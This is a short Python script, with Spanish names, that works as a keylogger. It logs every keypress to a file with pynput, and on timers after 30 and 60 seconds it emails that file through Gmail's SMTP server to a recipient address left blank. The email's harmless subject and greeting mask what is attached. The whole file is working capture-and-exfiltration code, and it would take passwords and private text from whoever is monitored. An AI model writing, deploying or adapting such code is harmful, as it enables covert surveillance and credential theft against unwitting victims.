from email.message import EmailMessage
from pynput.keyboard import Listener
import logging
import smtplib
import threading

logging.basicConfig(filename="Resultado.txt", level=logging.DEBUG)

def captura(key):
    logging.info(key)
    print(key)

def envio():
    email = ''
    email_contraseña = ''
    email_receptor = ''

    asunto = 'Esto es una prueba'
    cuerpo = "Hola te escribo usando python"

    mensaje = EmailMessage()
    mensaje['Subject'] = asunto
    mensaje['From'] = email
    mensaje['To'] = email_receptor
    mensaje.set_content =(cuerpo)

    with open("Resultado.txt", "rb") as l:
        mensaje.add_attachment(
        l.read(),
        filename="Resultado.txt",
        maintype="application",
        subtype="txt"
        )

    servidor = smtplib.SMTP('smtp.gmail.com')
    servidor.starttls()
    servidor.login(email, email_contraseña)
    servidor.sendmail(email, email_receptor, mensaje.as_string())

    print('Correo enviado')
    servidor.quit()

t = threading.Timer(30, envio)
t.start()
print('Esperando para enviar correo')

y = threading.Timer(60, envio)
y.start()


with Listener(on_press=captura) as k:
    k.join() 



